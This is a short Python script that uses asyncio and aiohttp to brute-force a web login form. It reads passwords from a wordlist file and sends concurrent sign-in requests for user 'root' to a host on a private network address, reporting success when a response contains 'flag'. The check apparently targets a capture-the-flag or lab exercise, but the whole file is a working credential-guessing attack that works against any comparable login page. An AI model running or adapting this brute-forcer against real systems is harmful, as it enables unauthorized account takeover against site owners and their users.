import asyncio
import aiohttp
import time

BASE_URL = 'http://192.168.1.47/'
FILE_NAME = 'passwords.txt'

async def get_result(session, password):
	print(f"Trying {password}...\n")
	params = {
		'page': 'signin',
		'username': 'root',
		'password': password,
		'Login': 'Login'
	}
	async with session.get(BASE_URL, params=params) as resp:
		text = await resp.text()
		if 'flag' in text.lower():
			print(f"\033[0;32;40mPassword found: {password}")
		else:
			print(f"\033[0;34;40m{password} is not the right password")
		print("\033[0;37;40m")


async def main():
	tasks = []
	s = time.perf_counter()
	async with aiohttp.ClientSession() as session:
		for i, line in enumerate(open(FILE_NAME)):
			tasks.append(asyncio.create_task(get_result(session, line[:-1])))
		await asyncio.gather(*tasks)

if __name__ == '__main__':
	asyncio.run(main())